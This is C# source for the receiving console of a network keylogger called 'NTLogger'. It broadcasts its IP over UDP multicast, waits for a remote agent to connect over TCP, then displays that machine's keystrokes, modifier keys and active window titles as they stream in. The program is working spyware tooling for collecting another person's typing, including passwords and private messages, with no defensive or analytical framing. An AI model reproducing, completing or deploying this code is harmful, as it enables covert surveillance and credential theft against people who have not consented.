using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace NTLogger
{
    internal class NTLogClient
    {
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        private static readonly Keys[] MODIFIER_KEYS = new Keys[]
        {
            Keys.LShiftKey,
            Keys.RShiftKey,
            Keys.Alt,
            Keys.LMenu,
            Keys.RMenu,
            Keys.LControlKey,
            Keys.RControlKey
        };

        static void Main(string[] args)
        {
            Console.WriteLine("=== NTLOG CLIENT UTILITY ===");
            try
            {
                // Setup UDP broadcast socket
                Socket udpBroadcastSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                IPAddress broadcastIP = IPAddress.Parse("224.5.6.7");
                udpBroadcastSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.AddMembership, new MulticastOption(broadcastIP));
                udpBroadcastSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.MulticastTimeToLive, 10);
                byte[] ipMessage = Encoding.ASCII.GetBytes(GetIP4Address());
                IPEndPoint broadcastEndPoint = new IPEndPoint(broadcastIP, 10036);
                udpBroadcastSocket.Connect(broadcastEndPoint);

                // Setup listening server for connection
                TcpListener listener = new TcpListener(IPAddress.Any, 10035);
                listener.Start();
                Console.WriteLine($"Waiting for response...\n");
                
                // Broadcast our IP address until a connection is received
                int attempts = 0;
                while (!listener.Pending())
                {
                    udpBroadcastSocket.Send(ipMessage, ipMessage.Length, SocketFlags.None);
                    ClearLine();
                    Console.WriteLine($"Sent broadcast to {broadcastIP.ToString()} x{attempts++}");
                    Console.SetCursorPosition(0, Console.CursorTop - 1);
                    Thread.Sleep(2000);
                }
                udpBroadcastSocket.Close();

                // Begin connection after connection is received
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("\n\nConnection successful, now streaming keyboard input!\n");

                Console.WriteLine("Color Mappings: WHITE - Normal typed text\n" +
                                  "               YELLOW - Modfier pressed\n" +
                                  "          DARK YELLOW - Modifer released\n" +
                                  "                 CYAN - Command key pressed\n" +
                                  "         DARK BLUE BG - Modifier in effect\n" +
                                  "             GREEN BG - Active window changed\n");

                Console.WriteLine("<< KEYBD STREAM BEGIN >>");
                StreamReader sr = new StreamReader(client.GetStream());
                while (client.Connected)
                {
                    string cmd = sr.ReadLine();
                    switch (cmd)
                    {
                        case "K":
                            int wParam = int.Parse(sr.ReadLine());
                            int vkCode = int.Parse(sr.ReadLine());
                            Keys key = (Keys)vkCode;
                            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                            {
                                uint nonVirtualKey = MapVirtualKey((uint)key, 2);
                                char mappedChar = Convert.ToChar(nonVirtualKey);
                                if (mappedChar == '\0' 
                                    || key == Keys.Enter 
                                    || key == Keys.Back 
                                    || key == Keys.Escape 
                                    || key == Keys.Tab)
                                {
                                    if (!MODIFIER_KEYS.Contains(key))
                                    {
                                        Console.ForegroundColor = ConsoleColor.Cyan;
                                        Console.Write("[" + key + "]");
                                        break;
                                    }

                                    string keyName = key.ToString()
                                        .Replace("Key", "")
                                        .Replace("Control", "Ctrl")
                                        .Replace("Menu", "Alt")
                                        .Replace("Shift", "Sft");

                                    Console.ForegroundColor = ConsoleColor.Yellow;
                                    Console.BackgroundColor = ConsoleColor.DarkBlue;
                                    Console.Write("[" + keyName + "]");

                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.White;
                                    Console.Write(mappedChar + "");
                                }

                            }
                            else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
                            {
                                uint nonVirtualKey = MapVirtualKey((uint)key, 2);
                                char mappedChar = Convert.ToChar(nonVirtualKey);
                                if (mappedChar == '\0')
                                {
                                    if (!MODIFIER_KEYS.Contains(key))
                                        break;

                                    string keyName = key.ToString()
                                                .Replace("Key", "")
                                                .Replace("Control", "Ctrl")
                                                .Replace("Menu", "Alt")
                                                .Replace("Shift", "Sft");
                                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                                    Console.Write("[\\" + keyName + "]");
                                    Console.BackgroundColor = ConsoleColor.Black;
                                }

                            }
                            //Console.WriteLine("\n" + wParam + " " + vkCode + " " + key);
                            break;
                        case "W":
                            string windowName = sr.ReadLine();
                            Console.BackgroundColor = ConsoleColor.Green;
                            Console.ForegroundColor = ConsoleColor.Black;
                            Console.WriteLine($"\n:: {windowName}");
                            Console.ResetColor();
                            break;
                        default:
                            Environment.Exit(0);
                            break;
                    }
                    
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public static void ClearLine()
        {
            int currentLineCursor = Console.CursorTop;
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.Write(new string(' ', Console.WindowWidth));
            Console.SetCursorPosition(0, currentLineCursor);
        }

        public static string GetIP4Address()
        {
            string IP4Address = String.Empty;

            foreach (IPAddress IPA in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (IPA.AddressFamily == AddressFamily.InterNetwork)
                {
                    IP4Address = IPA.ToString();
                    break;
                }
            }

            return IP4Address;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern uint MapVirtualKey(uint ucode, uint umaptype);
    }
}
